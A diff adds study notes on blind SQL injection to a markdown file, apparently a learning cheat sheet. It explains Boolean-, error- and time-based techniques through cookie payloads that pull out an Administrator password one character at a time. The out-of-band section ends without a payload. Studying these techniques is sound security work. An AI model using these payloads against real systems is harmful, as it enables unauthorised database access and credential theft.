@@ -262,3 +262,89 @@ To list columns for a specific table, query information_schema.columns:
 
 Use table_name for filtering tables and column_name for columns.
 
+----
+
+## Blind SQL Injection - Summary & Techniques
+
+This document summarizes key concepts and exploitation techniques for Blind SQL Injection, including Boolean-based, Error-based, Time-based, and Out-of-band methods.
+
+## What is Blind SQL Injection?
+
+A vulnerability where SQL queries are injectable but the application does not display query results or database error details.
+
+Traditional UNION-based attacks usually do not work since the response does not reveal data directly.
+
+Exploitation relies on observing subtle changes in application behavior (e.g., response presence, delays, errors).
+
+Exploiting Blind SQL Injection via Cookies
+
+Many web apps use cookies (like TrackingId) for user/session tracking.
+
+The cookie value can be injected with SQL payloads to influence backend queries.
+
+Example cookie:
+```sql
+TrackingId=example_trackingid
+```
+
+Boolean-Based Blind SQL Injection
+
+Send payloads that cause the SQL query condition to be true or false.
+
+Observe application behavior differences to infer data.
+
+Example:
+```sql
+TrackingId=xyz' AND '1'='1 --  (Always TRUE, normal response)
+TrackingId=xyz' AND '1'='2 --  (Always FALSE, different response or error)
+Extracting password character by character:
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'--
+If response indicates TRUE, the first character of the password is greater than 'm'.
+```
+
+Adjust the character in the payload to narrow down each character.
+
+----
+
+## Error-Based Blind SQL Injection
+
+Use database errors triggered by crafted payloads to infer true/false conditions.
+
+Example payloads:
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' -- No error, condition false
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' -- Division by zero error, condition true
+Extract password characters:
+xyz' AND (
+  SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END
+  FROM Users
+) = 'a'--
+```
+---
+
+## Time-Based Blind SQL Injection
+
+Use delays to infer conditions when no visible error or response difference is present.
+
+Syntax example (SQL Server):
+
+```sql
+'; IF (1=1) WAITFOR DELAY '0:0:10'--   -- Causes 10 second delay (condition TRUE)
+'; IF (1=2) WAITFOR DELAY '0:0:10'--   -- No delay (condition FALSE)
+```
+
+Extract a character by timing delay:
+```sql
+'; IF (SELECT COUNT(*) FROM Users WHERE Username='Administrator' AND SUBSTRING(Password,1,1) > 'm') > 0 WAITFOR DELAY '0:0:5'--
+```
+Measure response time to determine if condition is true.
+
+---
+
+## Out-of-Band (OAST) Blind SQL Injection
+
+Leverages external channels (DNS, HTTP callbacks) to extract data when direct feedback is unavailable.
+
+Useful for highly secured environments blocking error or time-based attacks.
+
+
